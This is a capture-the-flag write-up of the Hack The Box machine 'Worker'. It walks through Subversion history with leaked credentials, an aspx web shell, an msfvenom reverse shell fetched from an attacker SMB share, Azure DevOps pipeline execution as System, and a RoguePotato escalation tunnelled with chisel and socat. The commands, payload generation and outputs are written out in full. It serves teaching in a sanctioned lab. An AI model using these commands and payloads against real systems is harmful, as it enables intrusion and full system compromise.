---
title: Hack The Box&#58; Worker
permalink: /HTB/Worker
layout: default
classes: wide
---
<img src="https://github.com/susMdT/Nigerald/blob/master/assets/images/Worker_Big.png?raw=true" class="Box_Logo" unselectable="on" />

Worker is a medium level box on HackTheBox and is unique because its usage of the DevOps workflow as an attack vector. Getting both user and System required either knowledge of Azure DevOps or some considerable enumeration, but everything else was not too difficult.

## Walkthrough

A basic and full port nmap scan, followed by a script scan on the ports found reveals the following information

```
┌──(root💀kali)-[/home/kali]            
└─# nmap -sVC -p 80,3690,5985 worker.htb                                                               
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-06 17:38 EST    
Nmap scan report for worker.htb (10.10.10.203)
Host is up (0.14s latency).                                                                            
                                                                                                       
PORT     STATE SERVICE  VERSION                                                                        
80/tcp   open  http     Microsoft IIS httpd 10.0                                                       
|_http-title: IIS Windows Server                                                                       
| http-methods:                                                                                        
|_  Potentially risky methods: TRACE                                                                   
|_http-server-header: Microsoft-IIS/10.0
3690/tcp open  svnserve Subversion                 
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                        
|_http-title: Not Found                                                                                
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

A  website is revealed to be open, but it is just the default IIS page. WinRM is also open, but more significant is Subversion, a version control tool like Git. Before we enumerate Subversion, we should run a subdomain search on the website just in case something vulnerable can be found.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Worker]
└─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u worker.htb 
===============================================================[136/271]
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://worker.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/12/07 03:45:12 Starting gobuster in VHOST enumeration mode
===============================================================
Found: alpha.worker.htb (Status: 200) [Size: 6495]
Found: story.worker.htb (Status: 200) [Size: 16045]
Found: cartoon.worker.htb (Status: 200) [Size: 14803]
Found: lens.worker.htb (Status: 200) [Size: 4971]
Found: dimension.worker.htb (Status: 200) [Size: 14588]
Found: spectral.worker.htb (Status: 200) [Size: 7191]                                                    
Found: twenty.worker.htb (Status: 200) [Size: 10134] 
```

These subdomains are just empty HTML5Up site templates. Onto Subversion. Enumerating it, we find that the repository has gone through some revision and there's a development website at http://devops.worker.htb (which means we need to add the entry "10.10.10.203 devops.worker.htb" to our /etc/hosts file). Also, there seems to be credentials leaked.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Worker/]
└─# svn log svn://worker.htb   
//Checking the commit history of the repo
------------------------------------------------------------------------
r5 | nathen | 2020-06-20 09:52:00 -0400 (Sat, 20 Jun 2020) | 1 line
Added note that repo has been migrated      
------------------------------------------------------------------------
r4 | nathen | 2020-06-20 09:50:20 -0400 (Sat, 20 Jun 2020) | 1 line
Moving this repo to our new devops server which will handle the deployment for us
------------------------------------------------------------------------
r3 | nathen | 2020-06-20 09:46:19 -0400 (Sat, 20 Jun 2020) | 1 line
-
------------------------------------------------------------------------
r2 | nathen | 2020-06-20 09:45:16 -0400 (Sat, 20 Jun 2020) | 1 line
Added deployment script
------------------------------------------------------------------------
r1 | nathen | 2020-06-20 09:43:43 -0400 (Sat, 20 Jun 2020) | 1 line
First version
------------------------------------------------------------------------


┌──(root💀kali)-[/home/kali/HackTheBox/Worker/]
└─# svn checkout svn://worker.htb
//Downloading the repo
A    dimension.worker.htb
A    dimension.worker.htb/LICENSE.txt
A    dimension.worker.htb/README.txt
A    dimension.worker.htb/assets
A    dimension.worker.htb/assets/css
A    dimension.worker.htb/assets/css/fontawesome-all.min.css
.....
A    dimension.worker.htb/index.html                                                                   
A    moved.txt                                                                                         
Checked out revision 5.

┌──(root💀kali)-[/home/kali/HackTheBox/Worker/dimension.worker.htb]
└─# cat ../moved.txt          
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :)

┌──(root💀kali)-[/home/kali/HackTheBox/Worker]
└─# svn up -r 2
//reverting the repo to one of the previous versions and finding something interesting
Updating '.':
D    moved.txt
A    deploy.ps1
Updated to revision 2.

┌──(root💀kali)-[/home/kali/HackTheBox/Worker]
└─# cat deploy.ps1       
$user = "nathen" 
$plain = "wendel98"
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

The credentials are valid and we can log in, but they don't work for Evil-WinRM (`evil-winrm -i 10.10.10.203 -u "nathen" -p "wendel98"` fails). After searching the site a bit, it seems that the repositories here correspond to the subdomains we found earlier. Playing around with the website shows us we can make commits too. We can start an SMB server with a exe reverse shell in it, upload a web shell (/usr/share/davtest/backdoors/aspx_cmd.aspx), spin up a netcat listener, then execute it. The web shell will probably be located at the respective subdomain of the branch that we merge.

```
//Generating the payload, spinning up the smb server, and creating a listener with rlwrap for a slightly better shell
┌──(root💀kali)-[/home/kali/HackTheBox/Worker]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=4444 -f exe > shell.exe                                             
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes

//The machine did a security check on my smb server so I had to put smb2 support on
┌──(root💀kali)-[/home/kali/HackTheBox/Worker]
└─# smbserver.py share . -smb2support 

┌──(root💀kali)-[/home/kali]
└─# rlwrap nc -nvlp 4444  
```

<video width="900" height="675" controls>
  <source src="https://user-images.githubusercontent.com/68256613/145005823-5649f846-7d7d-4a11-9d09-3e5a1e9215bb.mp4" type="video/mp4">
</video>
We're in as the defaultapppool user. Checking our privileges, it appears that we have SeImpersonate, and because this is a Server 2019 (from running `systeminfo` on the machine), we could try a RoguePotato attack. Or we can enumerate further. We'll get back to that first option.

```
c:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


```

Running winpeas (`\\10.10.16.6\\share\winpeas.exe` as defaultapppool), we find that theres a W: drive and that there is a user directory for robisl. Looking into the files of the W: directory, one that sticks out is in the W:\svnrepos\www\conf directory is named passwd. Reading it gives a bunch of credential pairs, but we see there is a pair for robisl.

```
c:\windows\system32\inetsrv> dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is 32D6-9041

 Directory of C:\Users

2020-07-07  16:53    <DIR>          .
2020-07-07  16:53    <DIR>          ..
2020-03-28  14:59    <DIR>          .NET v4.5
2020-03-28  14:59    <DIR>          .NET v4.5 Classic
2020-08-17  23:33    <DIR>          Administrator
2020-03-28  14:01    <DIR>          Public
2020-07-22  00:11    <DIR>          restorer
2020-07-08  18:22    <DIR>          robisl 	<------------------------------------a User
               0 File(s)              0 bytes
               8 Dir(s)  10246832128 bytes free
               
c:\windows\system32\inetsrv>type W:\svnrepos\www\conf\passwd

### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.
                                                   
[users]
..alot of pairs
robisl = wolves11
```

These credentials work for both WinRM and the DevOps website.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Worker]
└─# vil-winrm -i worker.htb -u 'robisl' -p 'wolves11'

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\robisl\Documents>
```

Robisl doesn't seem to have much more for us on the machine itself (even less considering we don't have SeImpersonate), but maybe the DevOps service has higher privileges (logging into the website as robisl and checking the "Agents "under the "Project Settings" confirms that Azure is our way to System). While the website itself has low privileges, as we saw earlier, Azure has something called Pipelines and Agents. Pipelines are meant to build and test code, but they have the potential to execute code too. Agents are what help them execute code and the website configurations showed us they are executed with System privileges. We will set up our listener, create a powershell script to call on our payload again, and then make and execute a pipeline so we can get a shell.

```
┌──(root💀kali)-[/home/kali]
└─# rlwrap nc -nvlp 4444    

*Evil-WinRM* PS C:\Users\robisl\Documents>mkdir C:\Temp

Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        12/7/2021  11:38 AM                Temp

*Evil-WinRM* PS C:\Users\robisl\Documents>echo 'powershell -command "cmd /c \\10.10.16.6\\share\shell.exe" > C:\Temp\script.ps1'
```

<video width="900" height="675" controls>
  <source src="https://user-images.githubusercontent.com/68256613/145005873-bef56dba-01c2-4d57-95f1-f55c64dfe227.mp4" type="video/mp4">
</video>

And now we're System. 

## Afterthoughts

This box was pretty fun, most of the steps lined up and it was interesting to be working with DevOps related stuff. Code execution through DevOps tools is definetely something to look out for. Also, having public repositories is probably not safe, especially when the history is viewable (for a company, anyways).

## Bonus

Lets not forget about RoguePotato. This probably wasn't the intended route, but its a viable route. RoguePotato is a very complicated exploit. Before we talk about that, we need to understand why JuicyPotato, another exploit utilizing SeImpersonate, doesn't work here. These exploits require access to the OXID resolver (to keep things simple, just know that this thing exists and don't question its functionality). JuicyPotato was able to access OXID through creating its own service on a custom port and querying OXID under the context of that service, and then the exploit would use the SeImpersonate token to grab the System token and run commands. However, in Server 2019, OXID can only be queried via port 135. Since JuicyPotato spawned its own service to query OXID, this doesn't work anymore. 

However, RoguePotato works by sending a remote OXID request, under the context of System, to our attacker machine, which will be forwarding the traffic back to the machine running RoguePotato, but on a port that RoguePotato is listening on. This listening port is actually a fake OXID server generated by RoguePotato. This fake OXID server points towards a named pipe that Rogue Potato also created, and the initial request (send as System) will trigger an "Authentication Callback". Because System is a client to the server (the named pipe), RoguePotato is able to use the SeImpersonate privilege to impersonate the client. From there, RoguePotato launches a process.

That was a lot of technical stuff (even though its heavily simplified). But how do we use it on this box? Well it's a little difficult because there's a firewall.

```
c:\Temp>netsh firewall show config 

Port configuration for Standard profile:                                           
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------
5985   TCP       Enable  Inbound               open winrm                          
3690   TCP       Enable  Inbound               Open Port 3690
8080   TCP       Enable  Inbound               Azure DevOps Server:8080
```

Remember, we need our attacker machine (the middle man in connecting the remote OXID request to the fake OXID server) to forward traffic back to the machine. But the firewall blocks this, as it is an inbound connection. Our solution: creating a tunnel with chisel. The machine will be the client connecting outbound to our attacking machine, the server. If you don't have the chisel.exe, you can just download it from the <a href="https://github.com/jpillora/chisel/releases/tag/v1.7.6">Github repo</a>, unzip it, and transfer it via SMB (`copy \\10.10.16.6\\share\chisel.exe C:\Temp\chisel.exe`).

```
//Our attacking machine is listening on 8000 for a chisel client to connect
┌──(root💀kali)-[/home/kali/GithubTools/chisel]
└─# chisel server -p 8000 --reverse 

2021/12/07 02:32:14 server: Reverse tunnelling enabled
2021/12/07 02:32:14 server: Fingerprint CudNiCK8VPwO5z06ZDkdUdnwsEDR1OEzsm+ZgQTfxl0=
2021/12/07 02:32:14 server: Listening on http://0.0.0.0:8000
2021/12/07 02:34:36 server: session#1: Client version (1.7.6) differs from server version (0.0.0-src)
2021/12/07 02:34:36 server: session#1: tun: proxy#R:9999=>localhost:9999: Listening

//We are connecting to our attacking machine, on the chisel server's port. From there we are redirecting traffic
//from the attacking machine's 9999 to our own 9999
c:\Temp>.\chisel64.exe client 10.10.16.6:8000 R:9999:localhost:9999

2021/12/07 09:48:53 client: Connecting to ws://10.10.16.6:8000
```

Now we set up our listener, our SMB server with our payload, and socat to redirect the traffic.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Worker]
└─# rlwrap nc -nvlp 4444

┌──(root💀kali)-[/home/kali/HackTheBox/Worker]
└─# smbserver.py share . -smb2support

//we are redirecting anything incoming to 135, to our own 9999. Because of chisel, our 9999 will be redirected //again to the victim machine on their 9999
┌──(root💀kali)-[/home/kali/HackTheBox/Worker]
└─# socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999 
```

With everything set up, let's run the exploit.

```
//Since our attacking machine is redirecting traffic back to our 9999, we set up RoguePotato to have its fake //server on 9999 to catch the traffic.
c:\Temp>.\RoguePotato.exe -r 10.10.16.6 -l 9999 -e "C:\Temp\shell.exe"

┌──(root💀kali)-[/home/kali]
└─# rlwrap nc -nvlp 4444                                                                         
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.203.
Ncat: Connection from 10.10.10.203:54846.
Microsoft Windows [Version 10.0.17763.1282]

c:\Temp>whoami
nt authority\system
```

And we have System, again! This was arguably as difficult, if not more, than the other attack vector. This one was more technical with the port forwarding and understanding of RoguePotato, but the other one required more enumeration and understanding of Azure DevOps. Overall, really cool stuff.

-Dylan Tran 12/7/2021


